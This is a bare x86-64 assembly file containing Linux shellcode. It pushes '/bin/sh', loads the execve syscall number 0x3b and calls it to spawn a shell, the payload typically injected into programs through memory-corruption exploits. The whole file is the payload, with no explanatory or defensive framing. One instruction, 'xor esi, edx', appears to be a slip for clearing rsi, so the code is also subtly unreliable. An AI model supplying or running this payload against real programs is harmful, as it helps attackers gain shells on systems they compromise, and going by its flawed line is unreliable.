.intel_syntax noprefix
.global _start

_start:
     mov rdi, 0x68732f6e69622f
     push rdi
     push rsp
     pop rdi
     push 0x3b
     pop rax
     xor esi, edx
     xor edx, edx
     syscall
